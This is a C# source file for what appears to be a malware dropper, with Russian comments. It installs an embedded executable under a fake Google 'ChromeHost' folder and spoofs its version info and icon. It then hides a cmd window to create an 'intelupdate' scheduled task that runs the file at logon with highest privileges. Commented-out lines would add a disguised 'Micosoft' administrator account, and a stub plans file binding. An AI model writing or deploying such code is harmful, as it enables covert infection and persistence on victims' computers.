using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using Vestris.ResourceLib;

namespace Setup
{
    class Program
    {
        //Место куда установится прога
        static DirectoryInfo DirSetup = new DirectoryInfo($"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}\\Google\\ChromeHost");
        static void Main(string[] args)
        {
            if(args.Length != 0)
            {
                if(args.Length == 2)
                {
                    /*
                     * Здесь будет компиляция склейки файла с установочником
                     * Я уже похожую фигню делал
                     */
                }

                return;
            }



            Console.WriteLine("Начало установки");

            if (!DirSetup.Exists)
                DirSetup.Create();

            DirSetup.Refresh();

            List<ProgrammFile> FilesForSetup = new List<ProgrammFile>()
            {
                new ProgrammFile("NetworkHost.exe", Properties.Resources.Project1488Reborn),
                new ProgrammFile("HornetInc.JsonAPI.dll", Properties.Resources.HornetInc_JsonAPI),
                new ProgrammFile("Newtonsoft.Json.dll", Properties.Resources.Newtonsoft_Json),
                new ProgrammFile("Vestris.ResourceLib.dll", Properties.Resources.Vestris_ResourceLib)
            };

            foreach(ProgrammFile PFile in FilesForSetup)
            {
                if (File.Exists(Path.Combine(DirSetup.FullName, PFile.Name)))
                    File.Delete(Path.Combine(DirSetup.FullName, PFile.Name));

                File.WriteAllBytes(Path.Combine(DirSetup.FullName, PFile.Name), PFile.bin);
            }

            VersionResource vr = new VersionResource();
            vr.LoadFrom(Path.Combine(DirSetup.FullName, "NetworkHost.exe"));

            StringFileInfo sfi = (StringFileInfo)vr["StringFileInfo"];

            sfi["OriginalFilename"] = "NetworkHost.exe";

            vr.Language = 0;
            vr.SaveTo((Path.Combine(DirSetup.FullName, "NetworkHost.exe")));


            using (FileStream fs = new FileStream(Path.Combine(DirSetup.FullName, "0.ico"), FileMode.Create))
                Properties.Resources._0.Save(fs);

            new IconDirectoryResource(new IconFile(Path.Combine(DirSetup.FullName, "0.ico"))).SaveTo(Path.Combine(DirSetup.FullName, "NetworkHost.exe"));

            File.Delete(Path.Combine(DirSetup.FullName, "0.ico"));

            //TODO: AutoStart
            Process pr = new Process();
            List<string> comms = new List<string>();
            //comms.Add($"net users Micosoft /add /fullname: \"Micosoft\" /PASSWORDCHG:NO");
            //comms.Add($"net localgroup Администраторы Micosoft /add");
            comms.Add($"schtasks /Create /SC ONLOGON /TN \"intelupdate\" /TR \"'{Path.Combine(DirSetup.FullName, "NetworkHost.exe")}'\" /F /RL HIGHEST");

            pr.StartInfo.FileName = $"{Environment.GetFolderPath(Environment.SpecialFolder.System)}\\cmd.exe";
            pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            pr.StartInfo.CreateNoWindow = true;

            foreach (string comm in comms)
            {
                pr.StartInfo.Arguments = "/C " + comm;
                pr.Start();
                while (!pr.HasExited)
                    Thread.Sleep(100);

            }

            pr.StartInfo.FileName = $"{DirSetup.FullName}\\NetworkHost.exe";
            pr.StartInfo.Arguments = string.Empty;

        }
    }
}
